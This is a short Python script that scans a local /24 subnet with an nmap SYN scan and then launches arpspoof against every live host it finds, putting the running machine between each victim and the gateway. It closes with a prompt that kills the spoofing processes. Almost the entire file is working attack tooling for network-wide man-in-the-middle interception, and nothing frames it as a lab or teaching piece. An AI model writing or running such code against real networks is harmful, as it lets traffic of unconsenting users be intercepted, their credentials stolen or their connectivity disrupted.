
import subprocess

# Define the nmap command
nmap_command = [
    "sudo", "nmap", "-sS", "-T4", "-n", "-F", "--max-retries", "1",
    "--host-timeout", "15m", "[IP]/24", "-oG", "-"
]

# Run the nmap command and capture the output
try:
    nmap_result = subprocess.check_output(nmap_command, text=True)
except subprocess.CalledProcessError as e:
    print(f"An error occurred while running nmap: {e}")
    nmap_result = ""

# If nmap has output, process it to find IP addresses
ip_addresses = []
if nmap_result:
    for line in nmap_result.splitlines():
        if "Host:" in line and "Up" in line:
            parts = line.split()
            ip_addresses.append(parts[1])

# Define the network interface and gateway IP address
network_interface = ""
gateway_ip = ""

# Loop through the list of IPs obtained from nmap and run the arpspoof command for each one
for ip in ip_addresses:
    arpspoof_command = ["sudo", "arpspoof", "-i", network_interface, "-t", ip, "-r", gateway_ip]
    print(f"Executing: {' '.join(arpspoof_command)}")
    subprocess.Popen(arpspoof_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

print("ARP spoofing initiated for all targets.")

kill = False  
while not kill: 
    num = int(input("Stop ARP spoofing? (1/0): "))  
    if num == 1:
        kill = True  

# Stop all arpspoof processes
subprocess.run(["sudo", "pkill", "arpspoof"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
print("ARP spoofing stopped.")
